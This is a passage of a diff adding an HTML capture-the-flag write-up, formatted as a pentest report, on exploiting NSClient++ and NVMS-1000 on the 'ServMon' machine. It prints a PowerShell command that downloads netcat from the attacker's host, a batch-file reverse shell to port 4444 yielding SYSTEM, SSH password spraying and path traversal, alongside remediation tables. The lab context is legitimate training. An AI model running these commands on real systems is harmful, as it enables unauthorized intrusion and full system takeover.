+                            <img src="../images/Posts/ServMon/24.png" alt="">
+                        </div>
+                        <p>run > run</p>
+                        <div class="writeup-image">
+                            <img src="../images/Posts/ServMon/26.png" alt="">
+                        </div>
+                        <p>We received the icmp trace and can confirm the arbitrary command execution.</p>
+                        <div class="writeup-image">
+                            <img src="../images/Posts/ServMon/27.png" alt="">
+                        </div>
+                        <p>We will now try to send to us a reverse shell. We download netcat from a repository like this one <a href="https://github.com/int0x33/nc.exe/" target="_blank">https://github.com/int0x33/nc.exe/</a> and send it to the target machine.</p>
+                        <p>We can use this command to download files to the target machine using powershell: `<strong>powershell Invoke-WebRequest -Uri http://10.10.14.60/nc.exe -Outfile C:\temp\nc.exe</strong>`</p>
+                        <p>Then we overwrite the previously created <strong>evi.bat</strong> file with the command: `<strong>echo c:\temp\nc.exe -e cmd 10.10.14.60 4444 >evil.bat</strong>`.</p>
+                        <div class="writeup-image">
+                            <img src="../images/Posts/ServMon/28.png" alt="">
+                        </div>
+                        <p>We listen on port <strong>4444</strong> on our machine, we run the script from the web page as we did with the ping command by clicking on <strong>run</strong>.</p>
+                        <p><strong>The IP of the target machine is different because I restarted the machine due to a intern problem with the server</strong>.</p>
+                        <div class="console-code">
+                            <pre>
+$ nc -nvlp 4444
+listening on [any] 4444 ...
+connect to [10.10.14.60] from (UNKNOWN) [10.129.54.213] 50434
+Microsoft Windows [Version 10.0.17763.864]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+C:\Program Files\NSClient++>whoami
+whoami
+nt authority\system
+
+C:\Program Files\NSClient++>
+                            </pre>
+                        </div>
+                        <div class="writeup-image">
+                            <img src="../images/Posts/ServMon/29.png" alt="">
+                        </div>
+                        <p>And finally we receive the reverse shell on our machine as the highest privileged user on the system.</p>
+
+                    
+                    <div id="Technical-Findings-Details">
+                        <h1>5. Technical Findings Details</h1>
+                        <h3>Privilege Escalation in NSClient++ - <span style="color: red">Critical</span></h3>
+                        <table id="tech-details">
+                            <thead>
+                                <tr>
+                                    <th id="column-th-1-red">CWE</th>
+                                    <th id="column-th-2"><a href="https://cwe.mitre.org/data/definitions/264.html" target="_blank">CWE-264</a></th>
+                                </tr>
+                            </thead>
+                            <tbody>
+                                <tr>
+                                    <td id="column-1-red">CVSS</td>
+                                    <td id="column-2-2">8.5</td>
+                                </tr>
+                                <tr>
+                                    <td id="column-1-red">Description</td>
+                                    <td id="column-2-1">A low-privilege user can execute arbitrary commands as the local system (NT Authority\System).</td>
+                                </tr>
+                                <tr>
+                                    <td id="column-1-red">Security Impact</td>
+                                    <td id="column-2-2">Arbitrary code execution, full system access with administrator privileges.</td>
+                                </tr>
+                                <tr>
+                                    <td id="column-1-red">Remedation</td>
+                                    <td id="column-2-1">Ensure that users do not have more privileges than necessary to perform their jobs. Conduct periodic reviews of permissions and configurations for critical services. Restrict non-privileged users from running commands or scripts.</td>
+                                </tr>
+                                <tr>
+                                    <td id="column-1-red">External References</td>
+                                    <td id="column-2-2"><a href="https://www.exploit-db.com/exploits/46802" target="_blank">https://www.exploit-db.com/exploits/46802</a></td>
+                                </tr>
+                            </tbody>
+                        </table>
+                        <h3>Finding Evidence</h3>
+                        <p>We will try to see if we can ping to us. We create the <strong>evil.bat</strong> file with the ping command inside. `<strong>echo ping -n 1 10.10.14.60 > evil.bat</strong>`.</p>
+                        <div class="writeup-image">
+                            <img src="../images/Posts/ServMon/25.png" alt="">
+                        </div>                        
+                        <p>Returning to the web we click on test.</p>
+                        <div class="writeup-image">
+                            <img src="../images/Posts/ServMon/24.png" alt="">
+                        </div>
+                        <p>run > run</p>
+                        <div class="writeup-image">
+                            <img src="../images/Posts/ServMon/26.png" alt="">
+                        </div>
+                        <p>We received the icmp trace and can confirm the arbitrary command execution.</p>
+                        <div class="writeup-image">
+                            <img src="../images/Posts/ServMon/27.png" alt="">
+                        </div>
+                        <p>We will now try to send to us a reverse shell.</p>                       
+                        <div class="writeup-image">
+                            <img src="../images/Posts/ServMon/28.png" alt="">
+                        </div>
+                        <p>We listen on port <strong>4444</strong> on our machine, we run the script from the web page as we did with the ping command by clicking on <strong>run</strong>.</p>
+                        <div class="writeup-image">
+                            <img src="../images/Posts/ServMon/29.png" alt="">
+                        </div>
+                        
+                        <h3>NSClient++ Remote Authentication - <span style="color:red">High</span> </h3>
+                        <table id="tech-details">
+                            <thead>
+                                <tr>
+                                    <th id="column-th-1-red">CWE</th>
+                                    <th id="column-th-2"><a href="https://cwe.mitre.org/data/definitions/255.html" target="_blank">CWE-255</a></th>
+                                </tr>
+                            </thead>
+                            <tbody>
+                                <tr>
+                                    <td id="column-1-red">CVSS</td>
+                                    <td id="column-2-2">7.2</td>
+                                </tr>
+                                <tr>
+                                    <td id="column-1-red">Description</td>
+                                    <td id="column-2-1">The software allows an authenticated user to access the clear text password of the web service.</td>
+                                </tr>
+                                <tr>
+                                    <td id="column-1-red">Security Impact</td>
+                                    <td id="column-2-2">Exposure of credentials, which may allow access to critical systems or privileges.</td>
+                                </tr>
+                                <tr>
+                                    <td id="column-1-red">Remedation</td>
+                                    <td id="column-2-1">Store passwords in a secure format, such as hashing (preferably with an algorithm like bcrypt or PBKDF2). Use multi-factor authentication (MFA) to add an extra layer of security.</td>
+                                </tr>
+                                <tr>
+                                    <td id="column-1-red">External References</td>
+                                    <td id="column-2-2"><a href="https://www.exploit-db.com/exploits/46802" target="_blank">https://www.exploit-db.com/exploits/46802</a></td>
+                                </tr>
+                            </tbody>
+                        </table>
+                        <h3>Finding Evidence</h3>
+                        <p>Since we have two possible users: "nadine" and "nathan" and some passwords, we will try to do password sprying against SSH port 22 with the hydra tool.</p>
+                        <div class="writeup-image">
+                            <img src="../images/Posts/ServMon/9.png" alt="">
+                        </div>
+                        <p>So we have valid credentials. We connect via <strong>ssh</strong> with the credentials of the user `<strong>nadine</strong>` with the command: `<strong>ssh nadine@10.129.227.77</strong>` and the password previously found it.</p>
+                        <div class="writeup-image">
+                            <img src="../images/Posts/ServMon/10.png" alt="">
+                        </div>
+
+                        <h3>Directory Traversal on NVMS-1000 - <span style="color:red">High</span></h3>
+                        <table id="tech-details">
+                            <thead>
+                                <tr>
+                                    <th id="column-th-1-red">CWE</th>
+                                    <th id="column-th-2"><a href="https://cwe.mitre.org/data/definitions/22.html" target="_blank">CWE-22</a></th>
+                                </tr>
+                            </thead>
+                            <tbody>
+                                <tr>
+                                    <td id="column-1-red">CVSS</td>
+                                    <td id="column-2-2">7.5</td>
+                                </tr>
+                                <tr>
+                                    <td id="column-1-red">Description</td>
+                                    <td id="column-2-1">Allows access to files outside the expected path, potentially exposing sensitive information.</td>
+                                </tr>
+                                <tr>
+                                    <td id="column-1-red">Security Impact</td>
+                                    <td id="column-2-2">Access to confidential information (password dictionary), easy exploitation.</td>
+                                </tr>
+                                <tr>
+                                    <td id="column-1-red">Remedation</td>
+                                    <td id="column-2-1">Validate and sanitize all user input to prevent path manipulation. Implement whitelisting of accessible directories instead of allowing relative or absolute paths.</td>
+                                </tr>
+                                <tr>
+                                    <td id="column-1-red">External References</td>
+                                    <td id="column-2-2"><a href="https://www.exploit-db.com/exploits/47774" target="_blank">https://www.exploit-db.com/exploits/47774</a></td>
+                                </tr>
+                            </tbody>
+                        </table>
+                        <h3>Finding Evidence</h3>
+                        <p>We open Burpsuite and intercept the login request:</p>
+                        <div class="writeup-image">
+                            <img src="../images/Posts/ServMon/6.png" alt="">
+                        </div>
+                        <p>We send the request to the repeater, modify the path and send the request. It works!</p>
+                        <div class="writeup-image">
+                            <img src="../images/Posts/ServMon/7.png" alt="">
+                        </div>
+                        <p>Since we have the ability to read system files, we tried to read the Passwords.txt file that Nadine mentioned and found a small password dictionary.</p>
+                        <div class="writeup-image">
+                            <img src="../images/Posts/ServMon/8.png" alt="">
+                        </div>
+                    </div>                   
+                   
+                    <div id="Conclusion">
+                        <h1>7. Conclusion</h1>
+                        <p><strong>Effective exploitation of vulnerabilities</strong>: Through careful analysis, a chain of vulnerabilities was identified in the NVMS-1000 and NSClient++ systems, allowing access to sensitive credentials and escalation of privileges to take full control of the machine.</p>
+                        <p><strong>Severity of vulnerabilities</strong>: Privilege escalation and remote code execution (reverse shell) vulnerabilities are critical as they allow an attacker to gain complete control over the system, potentially compromising the integrity, confidentiality, and availability of the affected machine.</p>
+                        <p><strong>Importance of security in password configurations and storage</strong>: The exposure of passwords in clear text and the lack of proper validation of inputs are weak points that must be corrected to prevent attacks.</p>
+                        <p><strong>Proactive Mitigation</strong>: Implementing appropriate security controls, such as input validation, multi-factor authentication, and the principle of least privilege, can prevent exploitation of these vulnerabilities and protect systems from external attacks.</p>
+                        <p><strong>General Recommendation</strong>: It is critical to perform regular penetration testing and security audits on systems to detect and mitigate vulnerabilities before attackers can exploit them.</p>
+                    </div>
+                    
+                    <!--Final-->
+                </section>
+            </div>
+
+        </div>
+    </div>
+    
+    <!--Pet Cat-->
+    <div class="pet-container">
+        <img src="" alt="Walking Pet" id="pet" class="pet">
+    </div>
+    <script src="script.js"></script>
+    <!--Pet Cat-->
+</body>
+</html>
